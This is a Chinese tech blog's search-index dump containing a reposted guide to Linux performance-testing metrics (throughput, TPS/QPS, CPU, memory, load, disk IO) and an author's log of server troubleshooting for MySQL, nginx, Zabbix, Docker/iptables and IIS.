","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:4:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.4. 吞吐量/吞吐率 吞吐量是指系统处理客户请求数量的总和，可以指网络上传输数据包的总和，也可以指业务中客户端与服务器交互数据量的总和。 吞吐率是指单位时间内系统处理客户请求的数量，也就是单位时间内的吞吐量。可以从多个维度衡量吞吐率：①业务角度：单位时间（每秒）的请求数或页面数，即请求数/秒或页面数/秒；②网络角度：单位时间（每秒）网络中传输的数据包大小，即字节数/秒等；③系统角度，单位时间内服务器所承受的压力，即系统的负载能力。 吞吐率（或吞吐量）是一种多维度量的性能指标，它与请求处理所消耗的CPU、内存、IO和网络带宽都强相关。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:5:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.5. TPS/QPS TPS（Transaction Per Second）是指单位时间（每秒）系统处理的事务量。事务可以是用户自定义的一系列操作或者动作的集合，比如“用户注册“事务是点击注册按钮，填写用户注册信息，点击提交按钮，以及加载注册成功页面的动作集合。 QPS（Query Per Second）是指单位时间内查询或访问服务器的次数。 TPS和QPS的区别在于一个事务可以包含多次查询或访问服务器，也可以只查询或访问一次服务器。当多次查询或访问时，一个TPS相当于多个QPS；当只查询或访问一次时，一个TPS则等价于一个QPS。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:6:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.6. PV/UV PV和UV是衡量web网站性能容量的两个重要度量指标，经常用在电子商务网站领域中用来衡量网站的活跃度。 PV（Page View）是页面的浏览量或点击量，用户对系统或者网站任何页面的每一次点击或者访问都会被记录一次浏览量或点击量，对相同页面进行多次访问浏览量或点击量也会进行累计。 UV（Unique Vistor）是系统或者网站的独立访客，一段时间内相同客户端（或PC）访问系统或者网站只会被记录一次，连续重复访问或者浏览多个系统页面次数不会进行累计。 PV和UV按照统计周期划分，可以划分为全天PV、每小时PV、全天UV和每小时UV等。在一些数据或交易量非常庞大的场景中，比如双11或618等全民购物活动时，常常还会统计峰值PV和峰值UV。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:7:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2. Linux服务器性能指标 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:8:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2.1. CPU使用率 CPU使用率是单位时间内服务器CPU的使用统计，可以用除CPU空闲时间外其他时间占总CPU时间的百分比来表示，即：CPU使用率=1-CPU空闲时间/总CPU时间 命令：#top //top工具间隔3s会动态滚动更新一次数据 字段 说明 us (user) 用户态的CPU使用时间比例，是用户运行程序的真正时间，它不包括后面的ni时间； sy (system) 内核态的CPU使用时间比例，是操作系统的运行时间，操作系统运行时，用户运行程序往往处于等待状态； ni (nice) 表示低优先级用户态的CPU时间比例，取值范围为[-20,19]，数值越大，则优先级越低； id (idle) 表示空闲的CPU时间比例，值越大，CPU空闲时间比例越高，利用率越低； wa (iowait) 表示处于IO等待状态的CPU时间比例； hi (hard interrupt) 表示处理硬中断的CPU时间比例； si (soft interrupt) 与hi相反，表示处理软中断的CPU时间比例； st (steal) 表示当前系统运行在虚拟机中被其他虚拟机占用的CPU时间比例。 在性能测试中，系统整体的CPU使用率可以用（1-id）来计算。当us很高时，说明CPU时间主要消耗在用户代码上，可以从用户代码角度考虑优化性能；当sy很高时，说明CPU时间主要消耗在内核上，可以从是否系统调用频繁、CPU进程或线程切换频繁角度考虑性能的优化；当wa很高时，说明有进程在进行频繁的IO操作，可能是磁盘IO或者网络IO。 一般情况下，如果%us+%sy\u003c=70%，我们可以认为系统的运行状态良好。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:9:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2.2. 内存占用率 Linux的系统内存管理机制遵循内存利用率最大化的原则。内核会将空余的内存划分为cached（不属于free），对于有频繁读取操作的文件或数据会被保存在cached中。因此，对于linux系统来说，可用于分配的内存不止free的内存，同时还包括cached的内存（其实还包括buffers的内存）。 cached和buffers都属于缓存，它们的区别主要在于cached主要用来缓冲频繁读取的文件，它可以直接记忆我们打开的文件内容；而buffers主要用来给块设备做的缓冲大小，只记录文件系统的metadata以及tracking in-flight pages信息，比如存储目录里面的内容，权限等。 top工具既可以查看系统CPU使用情况，也可以查看系统内存使用信息。 命令：#top 在性能测试中，经常会用到系统已用内存、物理已用内存、系统内存占用率以及物理内存占用率这几个指标，它们的计算公式如下： 系统已用内存MemUsed=MemTotal-MemFree //包含buffers和cached 物理已用内存-/+Used= MemTotal-MemFree-MemBuffers-MemCached 系统内存占用率MemUsed%=（MemUsed/ MemTotal）*100% 物理内存占用率-/+Used%=(-/+Used/ MemTotal）*100% 一般情况下，系统内存占用率\u003c=70%，我们可以认为系统的内存使用情况良好，如果超出则说明系统内存资源紧张。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:10:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2.3. 系统平均负载 当发现系统出现卡断或者运行不顺畅时，我们可以通过uptime，top或者w命令来查看系统的负载情况。 uptime top w Linux的load average表示系统负载的平均值，显示的三个数值分别表示1分钟、5分钟和15分钟内的平均负载情况。这里的平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，可以简单的理解为平均负载就是系统平均活跃进程数。 其中可运行状态是指正在使用CPU或者正在等待CPU的进程（处于R状态：Running或者Runnable的进程）；不可中断状态的进程指的是正处于内核态关键流程中的进程，处于这个流程的进程是不可打断的，比如等待硬件设备的I/O响应。 举个例子，当平均负载的值为4： 对于只有1个CPU的系统，意味着平均有3个进程竞争不到CPU； 对于拥有4个CPU的系统，意味着CPU利用率为100%； 对于拥有8个CPU的系统，意味着CPU利用率为50%，有一半空闲。 可以看出，当系统平均负载的值如果超过系统CPU的数量时，那么系统有可能会遇到性能瓶颈，要视具体情况而定。 在性能测试中，我们也经常会通过比较1min、5min或者15min的值，来判断系统平均负载的变化情况： 如果1min的值大于5min或者15min的值，说明负载在增加； 如果1min的值小于5min或者15min的值，说明负载在减小； ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:11:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2.4. 磁盘IO Linux服务器性能除了CPU和内存外，还有磁盘IO也是一种常用的性能指标。 命令：#iostat –x –k 2 3 //每隔2S输出磁盘IO的使用情况，共采样3 字段 说明 rrqm/s 每秒对该设备的读请求被合并次数，文件系统会对读取同块(block)的请求进行合并； wrqm/s 每秒对该设备的写请求被合并次数； r/s 每秒完成的读次数； w/s 每秒完成的写次数； rkB/s 每秒读数据量(kB为单位)； wkB/s 每秒写数据量(kB为单位)； avgrq-sz 平均每次IO操作的数据量(扇区数为单位)； avgqu-sz 平均等待处理的IO请求队列长度； await 平均每次IO请求等待时间(包括等待时间和处理时间，毫秒为单位)； svctm 平均每次IO请求的处理时间(毫秒为单位)； %util 采用周期内用于IO操作的时间比率，即IO队列非空的时间比率； 在性能测试中，我们可以重点关注iowait%和%util参数。其中iowait% 表示CPU等待IO时间占整个CPU周期的百分比，如果iowait值超过50%，或者明显大于%system、%user以及%idle，表示IO可能存在问题了；%util表示磁盘忙碌的情况，一般%util\u003c=70%表示该磁盘IO使用状态良好。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:12:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"2.5. linux常用性能命令 CPU : cat /proc/cpuinfo、top、lscpu 内存: cat /proc/meminfo、free、vmstat 负载: cat /proc/loadavg、uptime、iostat 磁盘: df、du、iostat、fdisk -l 整体: vmstat 3 2 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:13:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"服务器运维故障记录","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Mysql Errcode: 24 - Too many open files https://blog.csdn.net/weixin_36343850/article/details/86293700 原因：打开文件数量太多，超出了open_files_limit这个参数的限制，在一个表中有多个分区的时候，这种情况更容易发生。 解决方法： 查看 open_files_limit参数, 使用show variables like '%open%';就可以看到了 修改 open_files_limit参数 在网上找了很多资料，有的说直接在/etc/mysql/mysql.conf.d/mysqld.cnf文件中的[mysqld]部分添加open_files_limit参数，比如open_files_limit=10240，并且在/etc/security/limits.conf 添加mysql soft nofile 10240和mysql hard nofile 10240这两个参数然后重启MySQL，但是发现不能生效。 以下方法可用： 在文件/etc/systemd/system/multi-user.target.wants/mysql.service(也有可能是/etc/systemd/system/mysql.service这个文件)最后添加LimitNOFILE=10240 然后执行systemctl daemon-reload，接着再重启mysql服务sudo service mysql restart,可以看到已经修改成功了 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:1:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"禅道bug管理系统 这个部署遇到的一个坑就是php打死获取不到session的位置 打开调试日志方式是将my.cnf 中debug设置为true 实际错误体现是 ERROR: 您访问的域名 xxx.xxx.xxx 没有对应的公司。 我的解决方案是 代码目录整体权限设置为777,然后删除掉my.cnf进行重装,重装后在目录权限调整为正常权限即可. 安装完成后，首页出现无限循环重定向，手动将my.php中PATH_INFO修改为GET，或在nginx传入变量PATH_INFO值$request_uri; ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:2:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"nginx 代理php产生的一些故障 记录一个nginx 代理 php 产生的问题,问题已经解决了,但是似乎还是没有找到根本原因,若有了解的,请一定解惑一二, 以下记录下处理过程 . 问题产生过程: A服务器代码迁移到B机器上,代码是rsync直接同步的,然后B运行的时候就出问题了,根据调试发现,无论访问什么(html/js/css)都会跳转到首页,实际应该是都会经过php解析(我发誓A和B的环境配置是一模一样的!A可以正常运行.), php框架为opencart . 浏览器访问表现以下错误: Resource interpreted as Stylesheet but transferred with MIME type text/html ERR_CONNECTION_REFUSED 处理过程 : 问题实际上是头一天发生的,经过多方调试发现,实际上通过域名访问任何资源均会跳转到首页,访问php资源则会出现无法加载js/css等静态资源全部都是MIME类型问题,nginx强行给css/js等资源设置一个content-type前端也无法识别正确,另外也测试过网上提供的多方解决方案,仍然无法得到解决 . 第二天, 保持原有nginx配置 , 我给对应站点首页的index.php代码中加入了echo 123; exit();进行测试,访问发现可正常断开,此时在访问根下的静态html测试文件,发现可以正常访问了,此时删除echo 123; exit();,重新访问index.php,发现(js/css)静态资源被升级为https访问,此时我给相关域名配置上证书,然后访问就正常了!!! 原因分析: 站点缓存(这个可能性最大),opencart框架实际上session是存储到数据库中的,估计很多的cache也是存于数据中的,而今天解决的时间也恰好距离我最后一次同步一天的样子. nginx 配置域名过多,导致配置混乱. B服务器的nginx实际上已经配置了很多个域名,php解析的SCRIPT_FILENAME 我使用的是$document_root,最后一次修改我也将$document_root修改为了具体的路径,不知道会不会是这个原因产生的. ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:3:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"zabbix 自动发现异常错误 具体错误表现 Cannot create item: item with the same key \"domain.status[{#DOMAIN_NAME},http_code]\" already exists. Cannot accurately apply filter: no value received for macro \"{#DOMAINNAME}\". 解决方案 这个是特么的自动发现脚本返回值的key必须用{}括起来,不然你即使是json格式他也不会认, 网上那些这个抄那个的坑货就只知道变量要大写，还有个坑告诉我要使用宏,用了宏就是第二个问题,不用第一个，这我是记得很清楚，宏并不是必定要有的啊，我以前写也基本没有加过。 我特么也是蠢了，写了这么多的自动发现，居然没有注意要括起来。 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:4:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"nginx 伪静态无效问题 具体错误体现 拿到apache的.htaccess文件后，通过https://www.winginx.com/en/htaccess转换为了nginx可用的规则，但加入后访问跳转一直是404,经检查location是定位成功了的，但就是访问不了 解决方案: 后续开发提供了另一个伪静态配置,所有rewrite是放在if指令中(!-e $request_filename)，然后就可以了。我对比了下，两者的差异就是，一个是放在了location中，定位了每一个rewrite所在的位置。还有就是放在if中的rewrite的匹配规则是用引号括起来了的。具体原因暂时还是每搞清楚。后续出现需测试下引号是否有影响. ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:5:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"nginx 反向代理后端服务器，部分资源出现502错误 问题描述: 后端是dotnet应用，反向代理时候域名请求页面部分css/js资源返回502错误。直接请求报错的css/js又是正常的，前端绕过nginx直接访问dotnet所有返回又是正常的。只有经过nginx会出现该问题。 解决过程： 网上搜索到很多的解决方案，这一个感觉有点用，但并没有解决我的问题,说的是header过大，超出了默认的1k，就会引发上述的upstream sent too big header，nginx把外部请求给后端处理，后端返回的header太大，nginx处理不过来就会导致502，这个问题提出的解决是，增大proxy_buffer_size/proxy_buffers/proxy_busy_buffers_size,不过还是记录下，毕竟不是每个问题原因都一样。 这是我当时参考的第二个方案,根据官方文档https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive,调整了upstream中keepalive,我原来设置的是2,现调整为16,并设置了Connection \"Keep-Alive\";(这个设置是为了保持http/1.0持久链接，官方不建议使用此参数，但我这边websokcet和http/1.0,单独设置一个并没有效果，所以两个都设置了)。这个方案当时解决了一部分的问题。但根本并未得到解决。 然后最终的方案，重启应用服务器，问题完全解决！！！ 原因分析：突然不知道怎么下笔了，反正就是系统tcp连接过多，最开始体现就是出现大量的CLOSE_WAIT,当时重启了对应占用的程序，清理一些连接，出现一定的好转，但也仅仅出现了好转，后面可能由于某些原因，导致重启应用也无法解决了，最后重启服务器，问题完全解决。 应该不是每个人都是这个原因，不过可以参考下。 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:6:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"nginx 反向代理 cdn回源(多层nginx)出现 502、503、504 等异常 在我的部署模式中，很多时候都是docker与实际应用环境混合部署(多环境，单节点)，大多的结构是 docker运行程序环境，nginx反向代理到docker暴露的端口，从而实现应用的正常访问。我这次遇到的这个问题，最开始的时候我以为是cdn的问题，因为当时我没有通过cdn直达服务器的时候访问都是正常的，然后通过cdn后，页面大多数请求就都出现了502等状态，这个时候我联系了运营商，他们说回源链接被断开了，是不是服务器上有相关安全策略，仔细的想了下，服务器上除了开启了iptables外，并没有其他的安全设置，正没有头绪的时候，突然想到docker需要依赖iptables转发，是不是这个原因导致防火墙又有问题了(因为之前我调整iptables的时候，导致过docker容器无法连接网络😥)，于是我把防火墙一关，然后cdn回源就正常了。 后续的处理，我关闭了服务器防火墙设置，重启了docker，重建了容器(防止容器网络出现问题，同时让docker重新创建自己的规则链)。对外的防火墙采用云防火墙现在公网流入流量。上面其他记录的故障中，估计也有这个原因导致的，但是不知道怎么调好了。(TODO:// 一个人运维好难，有点啥问题都不知道该找谁讨论下，全靠自己摸索) ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:7:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"nginx: [emerg] location “” cannot be inside the exact location “/favicon.ico” in xxxxxx 我这边遇到的此类问题多数为在location =/xxx {下继续include了location ,清除后解决 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:8:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"IIS低版本未映射 WebResource.axd 文件，导致相关图片或js等无法正常加载 (多出现地版本服务器上,当前记录server 2008 r2) 处理: 配置编辑器 –\u003e system.web/httpHandlers/ –\u003e 点击 Count 右侧的小点展开, 然后添加Path:WebResource.axd、type: System.Web.Handlers.AssemblyResourceLoader, validate: True , verb: GET ，完成后关闭 \u003cconfiguration\u003e \u003csystem.web\u003e \u003chttpHandlers\u003e \u003cadd path=\"WebResource.axd\" verb=\"GET\" type=\"System.Web.Handlers.AssemblyResourceLoader\" validate=\"True\" /\u003e \u003ctpHandlers\u003e \u003c/system.web\u003e \u003c/configuration\u003e ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:9:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"IIS 如何修改文件上传限制 要修改IIS中的文件上传限制，可以按照以下步骤操作： 打开IIS管理器（Internet Information Services Manager）。 在左侧导航栏中，展开服务器节点，并找到您要修改的站点。单击该站点。 在右侧窗口中，双击“配置编辑器”图标。 在“配置编辑器”窗口中，选择“system.webServer/Security/requestFiltering”节点。 在右侧窗口中，查找并编辑以下设置来修改文件上传限制： maxAllowedContentLength：此设置用于限制请求内容的最大大小。以字节为单位。例如，如果要将上传文件大小限制为100MB，则将其设置为104857600（100MB * 1024KB * 1024B）。 maxRequestLength：此设置用于限制请求的最大大小。以KB为单位。例如，如果要将上传文件大小限制为100MB，则将其设置为102400（100MB * 1024KB）。 注意：这两个设置需要同时更改，以确保文件上传限制的生效。 修改完上述设置后，点击“应用”按钮保存更改。 关闭“配置编辑器”窗口和IIS管理器。 现在，您已成功修改了IIS中的文件上传限制。请注意，这些设置可能会对整个站点或虚拟目录产生影响，因此请确保根据需要进行适当的调整。 \u003cconfiguration\u003e \u003csystem.webServer\u003e \u003csecurity\u003e \u003crequestFiltering\u003e \u003c!-- 100M --\u003e \u003crequestLimits maxAllowedContentLength=\"100000000\" /\u003e \u003c/requestFiltering\u003e \u003c/security\u003e \u003c/system.webServer\u003e \u003c/configuration\u003e ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:10:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"IIS .net 项目 post 无法提交数据 .net 站点 curl post请求，模拟表单提交，后端收不到数据，解决方案是把程序池的集成模式改为经典模式 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:11:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"IIS .net 项目 ，同项目复制一份出来重新部署就无法正常使用了 大致问题体现是 [Exception: 未将对象引用设置到对象的实例。] FrontEndProcessor.VoiceUtils.TextToSpeech xxxx 产生原因: 同一服务器上面，直接复制了一份出来，被复制的站点是可以正常使用的，复制出来后的站点，相对于复制前的站点同一功能就无法正常使用了。 解决： 经多方对比，发现问题是由于程序池设置导致，复制后的站点，程序池未开启 加载用户配置文件。 总结： windows上应不会存在权限相关问题，因此此类问题应该优先考虑程序池 ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:12:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"IIS .net项目下载文件出现访问被拒绝 异常体现 对路径“xxxx.JPG”的访问被拒绝。 说明: 执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。 异常详细信息: System.UnauthorizedAccessException: 对路径“xxxx.JPG”的访问被拒绝。 ASP.NET 无权访问所请求的资源。请考虑对 ASP.NET 请求标识授予访问此资源的权限。ASP.NET 有一个在应用程序没有模拟时使用的基进程标识(通常，在 IIS 5 上为 {MACHINE}\\ASPNET，在 IIS 6 和 IIS 7 上为网络服务，在 IIS 7.5 上为配置的应用程序池标识)。如果应用程序正在通过 \u003cidentity impersonate=\"true\"/\u003e 模拟，则标识将为匿名用户(通常为 IUSR_MACHINENAME)或经过身份验证的请求用户。 要将 ASP.NET 访问权限授予某个文件，请在文件资源管理器中右击该文件，选择“属性”，然后选择“安全”选项卡。单击“添加”添加适当的用户或组。突出显示 ASP.NET 帐户，选中所需访问权限对应的框。 源错误: 执行当前 Web 请求期间生成了未经处理的异常。可以使用下面的异常堆栈跟踪信息确定有关异常原因和发生位置的信息。 堆栈跟踪: [DirectoryNotFoundException: 未能找到路径“xxxxxx”的一部分。] System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) +490 System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost) +833 System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy) +144 System.IO.FileStream..ctor(String path, FileMode mode) +91 HTYD.Merchant.Controllers.ExportController.DownloadFile(String fPath) in xxxx.cs:192 System.Web.Mvc.\u003c\u003ec__DisplayClass1.\u003cWrapVoidAction\u003eb__0(ControllerBase controller, Object[] parameters) +15 ..... 解决方案: 此项问题产生原因不知道，但解决方案是，为该目录添加 IIS_USER 用户权限，注意需要附加 修改 权限 